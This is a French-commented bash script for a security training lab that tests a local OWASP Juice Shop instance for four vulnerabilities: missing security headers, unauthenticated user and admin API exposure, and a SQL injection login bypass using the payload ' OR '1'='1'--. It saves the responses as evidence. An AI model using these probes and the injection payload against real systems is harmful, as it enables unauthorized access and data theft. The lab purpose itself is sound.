#!/usr/bin/env bash
# =============================================================
# LAB 2 — Détection et validation manuelle des vulnérabilités
# Vulnérabilités : V01 Headers / V02 Users API / V03 Admin / V04 SQLi
# Usage : JUICE_SHOP_URL=http://localhost:3001 ./test_vulnerabilities_manuels.sh
# =============================================================
set -uo pipefail

TARGET="${JUICE_SHOP_URL:-http://localhost:3001}"
EVIDENCE="$(dirname "$0")/../evidence"
DATE=$(date '+%Y%m%d_%H%M%S')
T=10

mkdir -p "$EVIDENCE"/{http,requests,responses,notes}

save() { echo "$2" > "$EVIDENCE/$1"; echo "[PREUVE] $1"; }
sep()  { echo ""; echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"; echo " $1"; echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"; }

echo "============================================================"
echo " LAB 2 — Détection des vulnérabilités"
echo " Cible : $TARGET  |  Date : $DATE"
echo "============================================================"

# ── V01 — En-têtes de sécurité ───────────────────────────────
sep "V01 — Security Misconfiguration : En-têtes HTTP (A05:2021)"
HEADERS=$(curl -sI --connect-timeout $T "$TARGET" 2>/dev/null)
save "http/V01_security_headers.txt" "$HEADERS"
echo "En-têtes présents/absents :"
for h in "Strict-Transport-Security" "Content-Security-Policy" "X-Content-Type-Options" "X-Frame-Options"; do
    if echo "$HEADERS" | grep -qi "^$h:"; then
        echo "  [PRÉSENT]  $h"
    else
        echo "  [ABSENT]   $h ← MANQUANT"
    fi
done
echo "En-têtes indésirables :"
for h in "X-Powered-By" "Server"; do
    val=$(echo "$HEADERS" | grep -i "^$h:" | head -1 | sed 's/\r//' || true)
    [ -n "$val" ] && echo "  [EXPOSÉ]   $val" || echo "  [OK]       $h absent"
done
save "notes/V01_fiche.txt" "ID: V01 | OWASP: A05:2021 | CVSS: 5.3 | En-têtes CSP/HSTS/X-Content-Type manquants"

# ── V02 — Exposition /api/Users ──────────────────────────────
sep "V02 — Sensitive Data Exposure : /api/Users (A02:2021)"
CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout $T "$TARGET/api/Users" 2>/dev/null || echo "000")
RESP=$(curl -s --connect-timeout $T "$TARGET/api/Users" 2>/dev/null)
save "responses/V02_users_list.json" "$RESP"
COUNT=$(echo "$RESP" | grep -o '"email"' | wc -l || echo "0")
echo "  HTTP $CODE — $COUNT adresses email exposées"
[ "$CODE" = "200" ] && [ "$COUNT" -gt 0 ] \
    && echo "  [CONFIRMÉ] Données sensibles exposées sans authentification" \
    || echo "  [INFO] Endpoint protégé ou vide"
save "notes/V02_fiche.txt" "ID: V02 | OWASP: A02:2021 | CVSS: 7.5 | /api/Users expose $COUNT emails sans auth"

# ── V03 — Broken Access Control ──────────────────────────────
sep "V03 — Broken Access Control : API admin (A01:2021)"
CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout $T \
    "$TARGET/rest/admin/application-configuration" 2>/dev/null || echo "000")
RESP=$(curl -s --connect-timeout $T "$TARGET/rest/admin/application-configuration" 2>/dev/null)
save "responses/V03_admin_config.json" "$RESP"
echo "  GET /rest/admin/application-configuration → HTTP $CODE"
[ "$CODE" = "200" ] \
    && echo "  [CONFIRMÉ] Config admin accessible sans authentification" \
    || echo "  [INFO] Endpoint protégé (HTTP $CODE)"
save "notes/V03_fiche.txt" "ID: V03 | OWASP: A01:2021 | CVSS: 7.5 | Config admin exposée sans token"

# ── V04 — SQL Injection ──────────────────────────────────────
sep "V04 — SQL Injection : Authentification (A03:2021)"
PAYLOAD='{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"'--","password":"x"}'
CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout $T \
    -X POST -H "Content-Type: application/json" \
    -d "$PAYLOAD" "$TARGET/rest/user/login" 2>/dev/null || echo "000")
RESP=$(curl -s --connect-timeout $T \
    -X POST -H "Content-Type: application/json" \
    -d "$PAYLOAD" "$TARGET/rest/user/login" 2>/dev/null)
save "requests/V04_sqli_request.txt"  "POST /rest/user/login\nContent-Type: application/json\n\n$PAYLOAD"
save "responses/V04_sqli_response.json" "$RESP"
echo "  Payload : ' OR '1'='1'--"
echo "  HTTP    : $CODE"
if [ "$CODE" = "200" ] && echo "$RESP" | grep -q "token"; then
    echo "  [CONFIRMÉ] SQLi réussie — JWT retourné sans credentials valides"
else
    echo "  [INFO] Payload rejeté (HTTP $CODE)"
fi
save "notes/V04_fiche.txt" "ID: V04 | OWASP: A03:2021 | CVSS: 9.8 | SQLi bypass login confirmé"

echo ""
echo "============================================================"
echo " Preuves sauvegardées dans : $EVIDENCE"
find "$EVIDENCE" -type f | sort | sed 's|.*/evidence/||' | sed 's/^/  /'
echo "============================================================"
